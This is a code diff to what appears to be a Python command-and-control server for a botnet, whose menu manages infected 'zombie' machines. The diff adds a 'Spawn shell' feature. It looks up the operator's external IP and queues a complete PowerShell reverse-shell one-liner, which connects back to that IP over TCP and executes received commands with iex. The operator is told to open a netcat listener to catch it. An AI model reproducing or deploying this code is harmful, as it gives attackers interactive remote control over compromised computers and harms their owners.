@@ -4,6 +4,12 @@ import listener
 import bcrypt
 from prettytable import PrettyTable
 import threading
+import urllib.request
+
+
+external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+
+
 
 
 def list_zombies(socket):
@@ -30,6 +36,19 @@ def execute_command(socket):
 	for command in z.command_cue:
 		socket.send((command+'\n').encode())
 
+def spawn_shell(socket):
+	socket.send(b'Please choose a zombie to command by specifying his id: ')
+	choice = int(socket.recv(2048).decode('utf-8'))
+	z = listener.zombies[choice]
+	socket.send(('Zombie with uuid: '+z.uuid+' is selected.\n').encode())
+	socket.send(b'Please enter port: ')
+	port = socket.recv(2048).decode('utf-8')
+	socket.send(b'\nOpen a netcat listener on the selected port and press "enter" to continue.\n')
+	socket.recv(2048).decode('utf-8')
+	socket.send(b'\nPress ctrl+c to exit the shell. Dont enter exit or zombie will die!!!\n')
+	z.command_cue.append("$client = New-Object System.Net.Sockets.TCPClient(\\\""+external_ip+"\\\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
+
+
 def close_socket(socket):
 	socket.close()
 
@@ -41,7 +60,7 @@ def print_menu(socket):
 
 0) List zombies
 1) Execute command
-
+2) Spawn shell
 
 99) Exit
 
@@ -79,6 +98,8 @@ class ClientThread(threading.Thread):
 			# Execute command
 			elif choice == 1:
 				execute_command(self.clientsocket)
+			elif choice == 2:
+				spawn_shell(self.clientsocket)
 			# Close socket
 			elif choice == 99:
 				# Exit
